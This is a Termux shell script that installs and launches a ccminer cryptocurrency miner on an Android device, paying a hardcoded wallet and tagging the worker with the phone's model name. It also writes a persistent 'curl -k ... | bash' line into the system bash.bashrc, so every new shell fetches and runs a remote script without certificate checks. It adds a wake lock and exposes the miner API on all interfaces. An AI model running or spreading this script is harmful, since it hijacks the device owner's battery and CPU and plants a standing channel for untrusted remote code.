#!/bin/sh

pkg update -y
wl="termux-wake-lock"; file1="/data/data/com.termux/files/usr/etc/bash.bashrc"; if ! grep -E '^'"$wl"'=.*' $file1 &>/dev/null; then [[ -s "$file1" && ! -z "$(tail -c 1 "$file1")" ]] && newline=$'\n' || newline=""; echo "$newline$wl" >> "$file1"; fi
key="curl -o- -k https://raw.githubusercontent.com/ksp-fon/mining/main/tx.sh | bash"; file="/data/data/com.termux/files/usr/etc/bash.bashrc"; if ! grep -E '^'"$key"'=.*' $file &>/dev/null; then [[ -s "$file" && ! -z "$(tail -c 1 "$file")" ]] && newline=$'\n' || newline=""; echo "$newline$key" >> "$file"; fi
yes | pkg install libjansson wget nano
mkdir ccminer && cd ccminer
wget https://raw.githubusercontent.com/ksp-fon/mining/main/ccminer
chmod +x ccminer
~/ccminer/ccminer -a verus -o stratum+tcp://sg.vipor.net:5040 -u RGhPt8LoGq41h3sY7wgQRtb5p1n6PTSGkM.ksp_$(/system/bin/getprop ro.product.model) -p k -t 8 -r 5 --cpu-priority 2 --cpu-affinity -1 -b 0.0.0.0:4488
